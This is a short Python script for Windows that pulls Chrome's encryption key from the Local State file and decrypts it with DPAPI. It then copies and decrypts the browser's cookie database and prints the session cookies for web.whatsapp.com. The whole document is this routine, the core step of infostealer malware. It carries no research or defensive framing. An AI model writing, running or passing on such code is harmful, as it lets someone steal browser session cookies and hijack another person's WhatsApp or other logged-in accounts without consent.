import os
import sqlite3
import win32crypt  # Windows-only
import shutil
from Cryptodome.Cipher import AES
import json
import base64

def get_chrome_cookies(domain_filter="whatsapp"):
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies")
    tmp_db = "Cookies_temp.db"
    shutil.copyfile(login_data_path, tmp_db)

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()

    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    cookies = {}

    for host_key, name, encrypted_value in cursor.fetchall():
        if domain_filter in host_key:
            try:
                cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
                decrypted_value = cipher.decrypt(encrypted_value[15:])[:-16].decode()
            except Exception:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            cookies[name] = decrypted_value

    conn.close()
    os.remove(tmp_db)

    return cookies

# Example usage:
whatsapp_cookies = get_chrome_cookies("web.whatsapp.com")
for k, v in whatsapp_cookies.items():
    print(f"{k}: {v}")
